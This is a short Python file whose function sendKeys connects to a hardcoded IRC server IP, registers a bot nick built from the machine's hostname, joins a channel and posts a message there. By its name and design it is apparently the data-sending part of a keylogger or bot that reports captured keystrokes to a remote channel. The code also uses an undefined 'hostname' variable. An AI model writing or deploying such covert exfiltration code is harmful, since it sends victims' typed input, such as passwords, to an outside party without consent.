import string
import socket
import sys
import os
import random
import time

def sendKeys(msg):

	server = "209.97.147.243"       #settings
	channel = "#channel1"
	
	getVals = list([val for val in hostname if val.isalnum()])
	hostname_tmp = "".join(getVals)
	
	botnick = hostname[:10]#"dasdadsas"
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
	irc.connect((server, 6667))                                                      #connects to the server
	time.sleep(3)
	irc.send(bytes("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n", "UTF-8")) #user authentication
	time.sleep(3)
	irc.send(bytes("NICK "+ botnick +"\n", "UTF-8"))                            #sets nick
	time.sleep(3)
	irc.send(bytes("JOIN "+ channel +"\n", "UTF-8"))        #join the chan
	print("Enviando mensaje\n")
	time.sleep(3)
	irc.send(bytes("PRIVMSG ", "UTF-8") + bytes(channel, "UTF-8") + bytes(" :", "UTF-8") + bytes(msg, "UTF-8") + bytes("\r\n", "UTF-8"))
	irc.close()
	
	#try:
	#    text = irc.recv(2048).decode("UTF-8")   #receive the text
	#    print (text)
	#except Exception:
	#    pass
	#if text.find("PING") != -1:
	 #   irc.send(bytes("PONG ", "UTF-8") + bytes(text.split()[1], "UTF-8") + bytes("\r\n", "UTF-8"))
	
	#irc.send(bytes("PRIVMSG ", "UTF-8") + bytes(channel, "UTF-8") + bytes(" :", "UTF-8") + bytes(msg, "UTF-8") + bytes("\r\n", "UTF-8"))
